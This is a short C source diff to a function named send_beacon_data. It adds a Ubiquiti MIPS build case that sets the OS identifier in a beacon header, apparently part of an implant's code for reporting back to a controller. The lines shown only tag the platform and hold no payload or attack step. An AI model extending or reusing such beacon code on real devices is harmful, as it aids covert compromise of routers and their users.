@@ -333,12 +333,15 @@ static int send_beacon_data(BEACONINFO* beaconInfo, unsigned long uptime, int ne
 		bhdr.os = htons(BH_SOLARIS_X86);
 	#endif
 
-#elif defined LINUX
+#elif defined LINUX && !defined UBIQUITI
 	#if defined _X86
 		bhdr.os = htons(BH_LINUX_X86);
 	#elif defined _X86_64
 		bhdr.os = htons(BH_LINUX_X86_64);
 	#endif
+
+#elif defined UBIQUITI
+		bhdr.os = htons(BH_UBIQUITI_MIPS);
 
 #elif defined ARM
 	bhdr.os = htons(BH_ARM);
